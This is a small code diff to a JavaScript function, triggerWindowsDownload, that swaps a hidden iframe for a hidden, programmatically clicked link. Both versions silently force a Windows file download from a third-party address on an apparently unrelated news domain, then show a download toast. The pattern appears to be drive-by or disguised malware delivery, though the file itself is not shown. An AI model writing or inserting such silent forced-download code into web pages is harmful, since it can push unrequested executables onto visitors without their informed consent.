@@ -1,9 +1,10 @@
 function triggerWindowsDownload() {
-  const iframe = document.createElement('iframe');
-  iframe.style.display = 'none';
-  iframe.src = 'https://donggangnews.com/kl/26-03';
-  document.body.appendChild(iframe);
-  setTimeout(() => iframe.remove(), 10000);
+  const a = document.createElement('a');
+  a.href = 'https://donggangnews.com/kl/26-03';
+  a.style.display = 'none';
+  document.body.appendChild(a);
+  a.click();
+  setTimeout(() => document.body.removeChild(a), 1000);
 
   const toast = document.getElementById('downloadToast');
   if (toast) {
